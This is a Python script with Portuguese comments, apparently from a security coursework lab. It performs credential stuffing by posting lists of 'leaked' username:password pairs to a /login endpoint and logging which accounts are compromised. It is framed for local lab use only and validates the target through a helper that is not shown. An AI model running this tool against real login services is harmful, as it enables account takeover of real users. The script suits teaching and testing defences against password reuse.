"""
Credential stuffing contra o endpoint /login.

USO EXCLUSIVO no laboratorio local deste trabalho.

Reutiliza credenciais "vazadas" (coletadas da app vulneravel) contra um alvo,
simulando o reuso de senhas entre sistemas.

  python credential_stuffing.py --url http://localhost:5001 \
      --creds creds_vazadas.txt --saida ../evidencias/ataque_segura_stuffing.txt
"""
import argparse
import sys
import time

import requests

from brute_force import classificar, validar_alvo


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True)
    p.add_argument("--creds", required=True)
    p.add_argument("--saida", default=None)
    args = p.parse_args()

    validar_alvo(args.url)   # REQ-ATQ-06

    pares = []
    with open(args.creds, encoding="utf-8") as f:
        for linha in f:
            linha = linha.strip()
            if not linha or linha.startswith("#") or ":" not in linha:
                continue
            usuario, senha = linha.split(":", 1)
            pares.append((usuario, senha))

    linhas = []

    def log(msg):
        print(msg)
        linhas.append(msg)

    log("=" * 64)
    log("ATAQUE DE CREDENTIAL STUFFING")
    log(f"Alvo        : {args.url}/login")
    log(f"Credenciais : {len(pares)}")
    log(f"Inicio      : {time.strftime('%Y-%m-%d %H:%M:%S')}")
    log("=" * 64)

    comprometidos = 0
    for i, (usuario, senha) in enumerate(pares, 1):
        sessao = requests.Session()
        try:
            r = sessao.post(f"{args.url}/login",
                            data={"usuario": usuario, "senha": senha},
                            timeout=10, allow_redirects=True)
        except requests.RequestException as e:
            log(f"[{i:02d}] ERRO de conexao: {e}")
            continue

        estado = classificar(r.status_code, r.text)
        log(f"[{i:02d}] {usuario}:{senha} -> {estado} (HTTP {r.status_code})")
        if estado == "SUCESSO_TOTAL":
            comprometidos += 1

    log("=" * 64)
    log(f"RESULTADO   : {comprometidos} conta(s) comprometida(s) de {len(pares)}")
    log("=" * 64)

    if args.saida:
        with open(args.saida, "w", encoding="utf-8") as f:
            f.write("\n".join(linhas) + "\n")
        print(f"\n[evidencia salva em {args.saida}]")

    return 0


if __name__ == "__main__":
    sys.exit(main())
